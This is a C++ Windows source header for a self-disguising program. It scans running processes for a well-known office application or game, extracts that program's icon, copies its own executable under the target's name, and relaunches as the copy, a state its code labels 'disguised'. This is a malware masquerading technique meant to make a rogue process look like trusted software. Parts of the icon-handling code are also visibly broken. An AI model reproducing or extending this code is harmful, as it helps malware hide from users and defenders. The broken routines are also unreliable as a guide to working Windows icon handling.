#pragma once
#include <windows.h>
#include <psapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <vector>
#include <map>
#include <string>
#include <algorithm>
#include <chrono>
#include <fstream>
#include <unordered_set>
#include <filesystem>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "Version.lib")

namespace fs = std::filesystem;

// 定义图标文件结构
#pragma pack(push, 1)
typedef struct {
    WORD idReserved;
    WORD idType;
    WORD idCount;
} ICONDIR;

typedef struct {
    BYTE bWidth;
    BYTE bHeight;
    BYTE bColorCount;
    BYTE bReserved;
    WORD wPlanes;
    WORD wBitCount;
    DWORD dwBytesInRes;
    DWORD dwImageOffset;
} ICONDIRENTRY;
#pragma pack(pop)

// 全局变量
bool g_isDisguised = false;
HANDLE g_hMutex = NULL;

// 软件信息结构体 - 增强版
struct SoftwareInfo {
    std::string name;
    std::string path;
    std::string displayName;
    ULONGLONG totalTime = 0;
    FILETIME startTime;
    bool isRunning = false;
    int priority = 3; // 优先级：1=办公软件, 2=知名游戏, 3=其他软件
    bool hasIcon = false; // 新增：是否有可提取图标
    int iconQuality = 0; // 新增：图标质量评分（基于尺寸和颜色深度）
};

// 字符串转换辅助函数
class StringConverter {
public:
    static std::wstring ANSIToUnicode(const std::string& str) {
        if (str.empty()) return L"";
        int wideLen = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
        if (wideLen == 0) return L"";
        std::wstring wideStr;
        wideStr.resize(wideLen);
        MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wideStr[0], wideLen);
        if (!wideStr.empty() && wideStr.back() == L'\0') {
            wideStr.pop_back();
        }
        return wideStr;
    }

    static std::string UnicodeToANSI(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int ansiLen = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
        if (ansiLen == 0) return "";
        std::string ansiStr;
        ansiStr.resize(ansiLen);
        WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &ansiStr[0], ansiLen, NULL, NULL);
        if (!ansiStr.empty() && ansiStr.back() == '\0') {
            ansiStr.pop_back();
        }
        return ansiStr;
    }
};

// 文件名处理类
class FileNameHelper {
public:
    // 清理文件名，去除重复后缀和非法字符
    static std::string CleanFileName(const std::string& fileName) {
        if (fileName.empty()) return "";

        std::string cleanName = fileName;

        // 去除常见的可执行文件后缀
        std::vector<std::string> extensions = { ".exe", ".lnk", ".bat", ".com" };
        for (const auto& ext : extensions) {
            if (cleanName.size() > ext.size()) {
                std::string end = cleanName.substr(cleanName.size() - ext.size());
                std::transform(end.begin(), end.end(), end.begin(), ::tolower);
                if (end == ext) {
                    cleanName = cleanName.substr(0, cleanName.size() - ext.size());
                    break;
                }
            }
        }

        // 替换非法字符为下划线
        std::replace_if(cleanName.begin(), cleanName.end(),
            [](char c) {
                return !isalnum(c) && c != ' ' && c != '-' && c != '_' && c != '.';
            }, '_');

        // 限制文件名长度
        if (cleanName.size() > 50) {
            cleanName = cleanName.substr(0, 50);
        }

        return cleanName;
    }

    // 检查文件是否存在
    static bool FileExists(const std::string& filePath) {
        return fs::exists(filePath);
    }
};

class SoftwareTracker {
private:
    std::map<std::string, SoftwareInfo> softwareMap;

    // 增强版知名软件列表
    const std::unordered_set<std::string> officeSoftware = {
        "winword", "excel", "powerpnt", "outlook", "onenote", "access", "project",
        "visio", "publisher", "teams", "acrobat", "photoshop", "illustrator",
        "premiere", "after effects", "audition", "lightroom", "indesign",
        "coreldraw", "autocad", "sketchup", "solidworks", "maya", "blender",
        "zbrush", "notepad++", "vscode", "sublime", "intellij", "eclipse",
        "pycharm", "webstorm", "android studio", "xcode", "visual studio",
        "word", "ppt", "powerpoint", "chrome", "firefox", "edge", "browser",
        "office", "adobe", "microsoft", "google", "mozilla", "opera", "safari"
    };

    const std::unordered_set<std::string> gameSoftware = {
        "steam", "epic", "origin", "battle.net", "ubisoft", "gog", "riot",
        "bethesda", "rockstar", "ea", "minecraft", "fortnite", "league",
        "dota", "overwatch", "valorant", "csgo", "warzone", "among us",
        "roblox", "genshin", "eldenring", "cyberpunk", "witcher", "fallout",
        "skyrim", "wow", "diablo", "starcraft", "hearthstone", "battlegrounds"
    };

    bool IsSystemProcess(const std::string& processPath) {
        if (processPath.empty()) return true;

        char systemDir[MAX_PATH] = { 0 };
        char windowsDir[MAX_PATH] = { 0 };
        GetSystemDirectoryA(systemDir, MAX_PATH);
        GetWindowsDirectoryA(windowsDir, MAX_PATH);

        std::string pathLower = processPath;
        std::transform(pathLower.begin(), pathLower.end(), pathLower.begin(), ::tolower);

        std::vector<std::string> systemPatterns = {
            "\\windows\\", "\\system32\\", "\\syswow64\\", "\\drivers\\",
            "svchost.exe", "explorer.exe", "taskmgr.exe", "winlogon.exe",
            "csrss.exe", "smss.exe", "lsass.exe", "services.exe"
        };

        for (const auto& pattern : systemPatterns) {
            if (pathLower.find(pattern) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    std::string GetProcessPath(DWORD processID) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (!hProcess) return "";

        char path[MAX_PATH];
        DWORD pathSize = MAX_PATH;
        if (QueryFullProcessImageNameA(hProcess, 0, path, &pathSize)) {
            CloseHandle(hProcess);
            return std::string(path);
        }
        CloseHandle(hProcess);
        return "";
    }

    int GetSoftwarePriority(const std::string& processName) {
        std::string nameLower = processName;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

        for (const auto& keyword : officeSoftware) {
            if (nameLower.find(keyword) != std::string::npos) {
                return 1;
            }
        }

        for (const auto& keyword : gameSoftware) {
            if (nameLower.find(keyword) != std::string::npos) {
                return 2;
            }
        }

        return 3;
    }

    // 检查图标可用性并评估质量
    bool CheckIconAvailability(const std::string& filePath, int& qualityScore) {
        HICON hIcon = ExtractIconFromFile(filePath);
        if (!hIcon) {
            qualityScore = 0;
            return false;
        }

        // 评估图标质量
        ICONINFO iconInfo;
        if (GetIconInfo(hIcon, &iconInfo)) {
            BITMAP bmColor;
            GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmColor);

            // 质量评分：基于尺寸和颜色深度
            qualityScore = bmColor.bmWidth * bmColor.bmHeight * (bmColor.bmBitsPixel / 8);

            DeleteObject(iconInfo.hbmColor);
            DeleteObject(iconInfo.hbmMask);
        }
        else {
            qualityScore = 1; // 基本分
        }

        DestroyIcon(hIcon);
        return true;
    }

public:
    // 从文件提取图标（独立方法） - 改为公共方法
    static HICON ExtractIconFromFile(const std::string& filePath) {
        HICON icon = nullptr;

        // 方法1: 使用SHGetFileInfo提取图标
        SHFILEINFOA shInfo;
        if (SHGetFileInfoA(filePath.c_str(), 0, &shInfo, sizeof(shInfo),
            SHGFI_ICON | SHGFI_LARGEICON)) {
            icon = shInfo.hIcon;
        }

        // 方法2: 作为备选方案，从可执行文件资源中提取
        if (!icon) {
            HMODULE hModule = LoadLibraryExA(filePath.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
            if (hModule) {
                // 尝试提取第一个图标资源
                icon = (HICON)LoadImage(hModule, MAKEINTRESOURCE(1), IMAGE_ICON,
                    GetSystemMetrics(SM_CXICON), GetSystemMetrics(SM_CYICON),
                    LR_DEFAULTCOLOR);
                FreeLibrary(hModule);
            }
        }

        return icon;
    }

    // 获取目标软件（基于知名度和图标质量）
    SoftwareInfo GetTargetSoftwareByFameAndIcon() {
        DWORD processes[1024], cbNeeded;
        if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
            return SoftwareInfo();
        }

        DWORD processCount = cbNeeded / sizeof(DWORD);
        std::vector<SoftwareInfo> candidateList;

        for (DWORD i = 0; i < processCount; i++) {
            if (processes[i] == 0) continue;

            std::string path = GetProcessPath(processes[i]);
            if (path.empty() || IsSystemProcess(path)) continue;

            std::string name = PathFindFileNameA(path.c_str());
            int priority = GetSoftwarePriority(name);

            // 只考虑知名软件
            if (priority < 3) {
                int iconQuality = 0;
                bool hasIcon = CheckIconAvailability(path, iconQuality);

                SoftwareInfo info;
                info.name = name;
                info.path = path;
                info.displayName = name;
                info.priority = priority;
                info.hasIcon = hasIcon;
                info.iconQuality = iconQuality;

                candidateList.push_back(info);
            }
        }

        if (candidateList.empty()) {
            return SoftwareInfo();
        }

        // 按优先级和图标质量排序
        // 优先选择: 1) 办公软件 > 2) 游戏软件 > 3) 有高质量图标的 > 4) 有普通图标的 > 5) 无图标的
        std::sort(candidateList.begin(), candidateList.end(),
            [](const SoftwareInfo& a, const SoftwareInfo& b) {
                // 首先按软件类型优先级排序
                if (a.priority != b.priority) {
                    return a.priority < b.priority;
                }
                // 同类型软件中，有图标的优先
                if (a.hasIcon != b.hasIcon) {
                    return a.hasIcon > b.hasIcon;
                }
                // 都有图标的情况下，按图标质量排序
                if (a.hasIcon && b.hasIcon) {
                    return a.iconQuality > b.iconQuality;
                }
                // 其他情况按名称排序
                return a.name < b.name;
            });

        return candidateList[0];
    }
};

// 图标处理类
class IconManager {
public:
    static HICON ExtractIconFromFile(const std::string& filePath) {
        return SoftwareTracker::ExtractIconFromFile(filePath);
    }

    static bool SaveIconToFile(HICON hIcon, const std::string& filePath) {
        if (!hIcon) return false;

        std::wstring wFilePath = StringConverter::ANSIToUnicode(filePath);
        HANDLE hFile = CreateFileW(wFilePath.c_str(), GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        ICONINFO iconInfo;
        if (!GetIconInfo(hIcon, &iconInfo)) {
            CloseHandle(hFile);
            return false;
        }

        BITMAP bmColor, bmMask;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmColor);
        GetObject(iconInfo.hbmMask, sizeof(BITMAP), &bmMask);

        DWORD colorSize = bmColor.bmWidth * bmColor.bmHeight * (bmColor.bmBitsPixel / 8);
        DWORD maskSize = bmMask.bmWidth * bmMask.bmHeight * (bmMask.bmBitsPixel / 8);

        ICONDIR iconDir = { 0, 1, 1 };
        ICONDIRENTRY entry;
        entry.bWidth = static_cast<BYTE>(bmColor.bmWidth);
        entry.bHeight = static_cast<BYTE>(bmColor.bmHeight);
        entry.bColorCount = 0;
        entry.bReserved = 0;
        entry.wPlanes = bmColor.bmPlanes;
        entry.wBitCount = bmColor.bmBitsPixel;
        entry.dwBytesInRes = sizeof(BITMAPINFOHEADER) + colorSize + maskSize;
        entry.dwImageOffset = sizeof(ICONDIR) + sizeof(ICONDIRENTRY);

        DWORD bytesWritten;
        WriteFile(hFile, &iconDir, sizeof(ICONDIR), &bytesWritten, NULL);
        WriteFile(hFile, &entry, sizeof(ICONDIRENTRY), &bytesWritten, NULL);

        DeleteObject(iconInfo.hbmColor);
        DeleteObject(iconInfo.hbmMask);
        CloseHandle(hFile);

        return true;
    }
};

// 文件操作类
class FileManager {
public:
    static bool CopyAndRenameSelf(const std::string& newName, const std::string& iconPath = "") {
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        char currentDir[MAX_PATH];
        strcpy_s(currentDir, MAX_PATH, currentPath);
        PathRemoveFileSpecA(currentDir);

        // 使用FileNameHelper清理文件名
        std::string cleanName = FileNameHelper::CleanFileName(newName);
        std::string newPath = std::string(currentDir) + "\\" + cleanName + ".exe";

        std::cout << "尝试复制文件: " << currentPath << " -> " << newPath << std::endl;

        if (!CopyFileA(currentPath, newPath.c_str(), FALSE)) {
            std::cout << "文件复制失败，错误代码: " << GetLastError() << std::endl;
            return false;
        }

        // 修改图标
        if (!iconPath.empty() && FileNameHelper::FileExists(iconPath)) {
            if (ChangeExeIcon(newPath, iconPath)) {
                std::cout << "图标修改成功" << std::endl;
            }
            else {
                std::cout << "图标修改失败" << std::endl;
            }
        }

        return true;
    }

    static bool ChangeExeIcon(const std::string& exePath, const std::string& iconPath) {
        // 检查文件是否存在
        if (!FileNameHelper::FileExists(exePath) || !FileNameHelper::FileExists(iconPath)) {
            std::cout << "文件不存在: " << exePath << " 或 " << iconPath << std::endl;
            return false;
        }

        std::ifstream iconFile(iconPath, std::ios::binary | std::ios::ate);
        if (!iconFile) {
            std::cout << "无法打开图标文件: " << iconPath << std::endl;
            return false;
        }

        std::streamsize size = iconFile.tellg();
        iconFile.seekg(0, std::ios::beg);
        std::vector<char> iconData(size);
        if (!iconFile.read(iconData.data(), size)) {
            std::cout << "读取图标文件失败: " << iconPath << std::endl;
            return false;
        }

        std::wstring wExePath = StringConverter::ANSIToUnicode(exePath);
        HANDLE hUpdate = BeginUpdateResourceW(wExePath.c_str(), FALSE);
        if (!hUpdate) {
            std::cout << "BeginUpdateResource失败，错误代码: " << GetLastError() << std::endl;
            return false;
        }

        // 更新图标资源
        if (!UpdateResourceW(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            iconData.data(), static_cast<DWORD>(size))) {
            std::cout << "UpdateResource失败，错误代码: " << GetLastError() << std::endl;
            EndUpdateResourceW(hUpdate, TRUE);
            return false;
        }

        if (!EndUpdateResourceW(hUpdate, FALSE)) {
            std::cout << "EndUpdateResource失败，错误代码: " << GetLastError() << std::endl;
            return false;
        }

        return true;
    }
};

// 程序重启管理类
class RestartManager {
public:
    static bool IsAlreadyDisguised() {
        char currentExePath[MAX_PATH];
        GetModuleFileNameA(NULL, currentExePath, MAX_PATH);
        std::string currentExeName = PathFindFileNameA(currentExePath);
        return currentExeName != "original_name.exe";
    }

    static void RestartApplication(const std::string& newName) {
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);

        char currentDir[MAX_PATH];
        strcpy_s(currentDir, MAX_PATH, currentPath);
        PathRemoveFileSpecA(currentDir);

        // 使用FileNameHelper清理文件名
        std::string cleanName = FileNameHelper::CleanFileName(newName);
        std::string newPath = std::string(currentDir) + "\\" + cleanName + ".exe";

        std::cout << "尝试重启程序: " << newPath << std::endl;

        // 检查新文件是否存在
        if (!FileNameHelper::FileExists(newPath)) {
            std::cout << "新文件不存在: " << newPath << std::endl;
            return;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // 构建命令行
        std::string commandLine = "\"" + newPath + "\" --restarted";

        if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::cout << "新程序启动成功，退出当前进程..." << std::endl;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            exit(0);
        }
        else {
            std::cout << "重启失败，错误代码: " << GetLastError() << std::endl;
        }
    }
};

// 主逻辑函数
int mainc() {
    // 创建互斥体防止多实例运行
    g_hMutex = CreateMutexA(NULL, FALSE, "Global\\SoftwareTrackerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "程序已经在运行中" << std::endl;
        CloseHandle(g_hMutex);
        return 1;
    }

    std::cout << "开始查找知名软件（优先选择有高质量图标的）..." << std::endl;

    SoftwareTracker tracker;
    SoftwareInfo target = tracker.GetTargetSoftwareByFameAndIcon();

    if (target.name.empty()) {
        std::cout << "未找到知名的办公软件或游戏" << std::endl;
        CloseHandle(g_hMutex);
        return 1;
    }

    std::cout << "检测到目标软件: " << target.name << std::endl;
    std::cout << "软件类型: " << (target.priority == 1 ? "办公软件" : "游戏软件") << std::endl;
    std::cout << "图标可用: " << (target.hasIcon ? "是" : "否") << std::endl;
    if (target.hasIcon) {
        std::cout << "图标质量评分: " << target.iconQuality << std::endl;
    }

    // 提取图标（只有在有图标的情况下）
    HICON hIcon = nullptr;
    std::string iconPath;

    if (target.hasIcon) {
        hIcon = IconManager::ExtractIconFromFile(target.path);
        if (hIcon) {
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);

            std::string cleanName = FileNameHelper::CleanFileName(target.name);
            iconPath = std::string(tempPath) + cleanName + ".ico";

            if (IconManager::SaveIconToFile(hIcon, iconPath)) {
                std::cout << "图标提取成功: " << iconPath << std::endl;
            }
            else {
                std::cout << "图标保存失败" << std::endl;
                iconPath.clear();
            }
            DestroyIcon(hIcon);
        }
    }
    else {
        std::cout << "目标软件没有可提取的图标，跳过图标处理" << std::endl;
    }

    // 复制并重命名自身
    if (FileManager::CopyAndRenameSelf(target.name, iconPath)) {
        std::cout << "程序复制成功，准备重启..." << std::endl;

        // 标记为已伪装
        g_isDisguised = true;

        // 重启程序
        RestartManager::RestartApplication(target.name);
    }

    CloseHandle(g_hMutex);
    return 0;
}

